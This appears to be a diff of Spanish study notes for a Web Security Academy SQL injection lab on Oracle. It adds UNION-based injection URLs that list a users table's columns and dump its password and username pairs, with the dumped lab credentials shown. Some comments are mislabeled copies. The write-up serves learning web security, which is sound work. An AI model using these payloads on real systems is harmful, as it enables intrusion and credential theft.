@@ -54,10 +54,22 @@ Para seleccionar solo la base de datos que estamos usando en Oracle es más fác
 SELECT table_name FROM all_tables WHERE owner = 'PETER';
 ````
 
-**`Columnas`:** En Oracle se pone originalmente para mostrar las columnas
+**`Columnas`:** En Oracle se pone la siguiente sintaxis para mostrar las columnas
 
+````sql
+# Enumerar propietarios de tablas:
+SELECT column_name FROM all_tab_columns WHERE table_name = 'USERS_GZGVRP';
+````
 
+**`Data`:** En Oracle la data se extrae igual que en MySQL u otros BDSM:
 
+````sql
+# Enumerar propietarios de tablas:
+SELECT PASSWORD_VNKKZP,USERNAME_VLWODI FROM USERS_GZGVRP;
+
+# Concatenando en un solo campo
+SELECT PASSWORD_VNKKZP||' ::: '||USERNAME_VLWODI FROM USERS_GZGVRP;
+````
 
 ## Solución:
 
@@ -88,8 +100,15 @@ SELECT table_name FROM all_tables WHERE owner = 'PETER';
 
     ### Enumer Columnas:
 
+# Enumerar todas las columnas de la tabla "USERS_GZGVRP"
+.web-security-academy.net/filter?category=-Pets' Union Select '1',column_name FROM all_tab_columns WHERE table_name = 'USERS_GZGVRP' -- -
+        ## PASSWORD_VNKKZP
+        ## USERNAME_VLWODI
 
-
-
+    ### Data Dump!!!:
+.web-security-academy.net/filter?category=-Pets' Union Select '1',PASSWORD_VNKKZP||' ::: '||USERNAME_VLWODI FROM USERS_GZGVRP -- -
+        ## 6yzszhm1lq9t6o7v8tji ::: administrator
+        ## ntyvu0tt06veacxzos1b ::: carlos
+        ## y8m3qcueovqb7ao29fky ::: wiener
 
 ````
